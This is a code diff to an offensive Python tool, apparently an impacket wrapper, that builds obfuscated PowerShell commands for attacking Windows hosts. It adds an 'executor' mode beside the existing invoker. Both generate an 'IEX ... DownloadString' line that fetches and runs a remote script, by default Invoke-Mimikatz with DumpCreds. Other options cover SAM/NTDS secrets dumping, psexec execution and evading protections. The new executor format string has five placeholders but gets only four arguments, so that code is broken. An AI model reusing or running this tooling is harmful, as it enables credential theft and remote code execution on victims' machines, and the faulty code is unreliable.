@@ -72,6 +72,9 @@ class Obfiscator:
         elif "psexec" in self.execution:
             # Direct invoker via psexec
             self.invoker_psexec()
+        elif "executor" in self.execution:
+            # Direct PowerShell execution
+            self.executor()
         elif "group" in self.execution:
             # Extract Group Members
             self.group_members()
@@ -95,6 +98,12 @@ class Obfiscator:
     def invoker(self):
         # Invoke Mimikatz Directly
         text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
+        self.command = self.packager(text)
+        self.unprotected_command = self.clearer(text)
+
+    def executor(self):
+        # Invoke a PowerShell Script Directly
+        text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function))
         self.command = self.packager(text)
         self.unprotected_command = self.clearer(text)
 
@@ -182,7 +191,7 @@ Create Pasteable Double Encoded Script:
     parser = argparse.ArgumentParser(usage=usage, description="A wrapping and execution tool for a some of the most useful impacket tools", epilog="This script oombines specific attacks with dynmaic methods, which allow you to bypass many protective measures.")
     group1 = parser.add_argument_group('Method')
     group2 = parser.add_argument_group('Attack')
-    group3 = parser.add_argument_group('SAM and NTDS.DIT Options, used with --sam_dump')
+    group3 = parser.add_argument_group('SAM and NTDS.DIT Options, used with --secrets-dump')
     iex_options = parser.add_argument_group('PowerShell IEX Options')
     remote_attack = parser.add_argument_group('Remote Target Options')
     generator = parser.add_argument_group('Filename for randimization of script')
@@ -192,12 +201,13 @@ Create Pasteable Double Encoded Script:
     iex_options.add_argument("-i", action="store", dest="src_ip", default=None, help="Set the IP address of the Mimkatz server, defaults to eth0 IP")
     iex_options.add_argument("-n", action="store", dest="interface", default="eth0", help="Instead of setting the IP you can extract it by interface, default eth0")
     iex_options.add_argument("-p", action="store", dest="src_port", default="8000", help="Set the port the Mimikatz server is on, defaults to port 8000")
-    iex_options.add_argument("-x", action="store", dest="payload", default="Invoke-Mimikatz.ps1", help="The name of the Mimikatz file, the default is Invoke-Mimikatz.ps1")
-    iex_options.add_argument("-a", action="store", dest="mim_arg", default="DumpCreds", help="Allows you to change the argument name if the Mimikatz script was changed, defaults to DumpCreds")
-    iex_options.add_argument("-f", action="store", dest="mim_func", default="Invoke-Mimikatz", help="Allows you to change the function name if the Mimikatz script was changed, defaults to Invoke-Mimikatz")
+    iex_options.add_argument("-x", action="store", dest="payload", default="Invoke-Mimikatz.ps1", help="The name of the file to injected, the default is Invoke-Mimikatz.ps1")
+    iex_options.add_argument("-a", action="store", dest="mim_arg", default="DumpCreds", help="Allows you to change the argument name if you are not using the Mimikatz script, defaults to DumpCreds")
+    iex_options.add_argument("-f", action="store", dest="mim_func", default="Invoke-Mimikatz", help="Allows you to change the function or cmdlet name if not using Invoke-Mimikatz, defaults to Invoke-Mimikatz")
     attack.add_argument("--invoker", action="store_true", dest="invoker", help="Configures the command to use Mimikatz invoker")
     attack.add_argument("--downloader", action="store_true", dest="downloader", help="Configures the command to use Metasploit's exploit/multi/script/web_delivery")
-    attack.add_argument("--secrets_dump", action="store_true", dest="sam_dump", help="Execute a SAM table dump")
+    attack.add_argument("--secrets-dump", action="store_true", dest="sam_dump", help="Execute a SAM table dump")
+    attack.add_argument("--executor", action="store_true", dest="executor", help="Execute a PowerShell Script")
     attack.add_argument("--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe")
     attack.add_argument("--group-members", action="store", dest="group", help="Identifies members of Domain Groups through PowerShell")
     remote_attack.add_argument("-t", action="store", dest="target", default=None, help="The system you are attempting to exploit")
